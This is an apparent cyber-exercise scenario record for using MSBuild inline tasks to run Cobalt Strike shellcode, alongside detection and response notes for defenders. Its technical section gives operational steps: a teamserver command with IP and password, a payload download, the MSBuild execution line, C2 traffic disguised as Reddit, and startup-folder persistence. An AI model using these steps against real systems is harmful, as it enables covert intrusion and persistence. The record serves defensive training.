Id: 0
Name: GCD-2020-01-MC2
ExtendedName: It's Inside the XML Document - MSBuild Executing Inline-Task
ExecutiveSummary: Builds an xml file with a C# inline-task which executes shellcode.
TargetedSystems: OPS.3.2
Detection: Traffic coming from MSBuild.exe
Storyline: <div class="content-wrapper"><p><span class="confluence-embedded-file-wrapper conf-macro output-inline" data-hasbody="false" data-macro-name="view-file"><a class="confluence-embedded-file" href="/confluence/download/attachments/177144044/HelpDeskTicket.docx?version=2&amp;modificationDate=1582562848000&amp;api=v2" data-nice-type="Word Document" data-file-src="/confluence/download/attachments/177144044/HelpDeskTicket.docx?version=2&amp;modificationDate=1582562848000&amp;api=v2" data-linked-resource-id="182977075" data-linked-resource-type="attachment" data-linked-resource-container-id="177144044" data-linked-resource-default-alias="HelpDeskTicket.docx" data-mime-type="application/vnd.openxmlformats-officedocument.wordprocessingml.document" data-has-thumbnail="true" data-linked-resource-version="2"><img src="/confluence/rest/documentConversion/latest/conversion/thumbnail/182977075/2" height="250"></a></span><span class="confluence-embedded-file-wrapper conf-macro output-inline" data-hasbody="false" data-macro-name="view-file"><a class="confluence-embedded-file" href="/confluence/download/attachments/177144044/HelpDeskTicket.pdf?version=2&amp;modificationDate=1582562854000&amp;api=v2" data-nice-type="PDF Document" data-file-src="/confluence/download/attachments/177144044/HelpDeskTicket.pdf?version=2&amp;modificationDate=1582562854000&amp;api=v2" data-linked-resource-id="182977076" data-linked-resource-type="attachment" data-linked-resource-container-id="177144044" data-linked-resource-default-alias="HelpDeskTicket.pdf" data-mime-type="application/pdf" data-has-thumbnail="true" data-linked-resource-version="2"><img src="/confluence/rest/documentConversion/latest/conversion/thumbnail/182977076/2" height="250"></a></span></p></div>
Organization: NA
Intel: NA;
AnticipatedResponse: Locate from what process the traffic is coming from and shut down that process.Find the file located in startup and remove it.
TechnicalDetails: "Based upon https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-cDownload XML file from here: www.newsvine.com/downloads/cool_proj.csprojStarting Cobalt Strike Server (red.19.centos7.mexico.400):cd into /opt/cobalt/cobaltstrikerun ./teamserver 132.254.34.70 password /home/step-admin/Desktop/normal/reddit.profileStarting Cobalt Strike Client (red.19.centos7.mexico.400):CD into /opt/cobalt/cobaltstrikeRun ./cobaltstrikeConnect to the teamserver aboveCreate your shellcode you want to put into the xml document. I will be using shellcode from Cobalt Strike.NOTE: You are able to use any kind of shellcode you desire. For this example, I'm going to be using shellcode created from Cobalt Strike.From Cobalt Strike, select Packages ? Payload GeneratorIn the Payload Generator Window, select your listener and set your output to C#Click add and save itOnce you have your shellcode, insert it into the xml document.NOTE: XML file is at the bottom of this document and also located on the centos machine.On the Windows machine, use build MSBuild.exe.NOTE: Once you use MSBuild it will &quot;hang&quot; on the build started dialog. To get around this, you could just run this in a headless cmd prompt.Open cmdRun &quot;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe (PATH OF THE XML FILE)&quot;MSBuild.exe build the XML file with the inline-task. This will execute your shellcode. In my case, it will connect to my C2.Cobalt Strike autobeacon.cna ScriptYou are able to write scripts to automate beaconsMy script will run a program called Seatbelt that's written in C#This code is run under the process of msbuild.exe and is in clear textSeatbelt scans for just about everything in the systemMalleable C2Using Cobalt Strike's &quot;Malleable C2&quot; to change how the HTTP traffic looks likeIn this inject, it going to look like Reddit trafficPersistenceIn this exercise, we are going to gain some persistence.One of the scripts imports persistence modules which makes it easier for us to do this.Once the MSBuild.exe process initially connects, right click on that beacon and go to Persistence ? Misc ? Misc: Startup FolderFill out the form in this order:Filename: tnt.exeStartup Directory: %APPDATA% (Shouldn't have to touch this)Listener: Listen HTTPCustom File: /home/step-admin/Desktop/tnt.exeClick execute and file will be placed in the startup folder on the Window's machine"
Owner: <p>Austin Vershave</p>
Created: 2020-07-24T19:17:12.5949260Z
Details: []
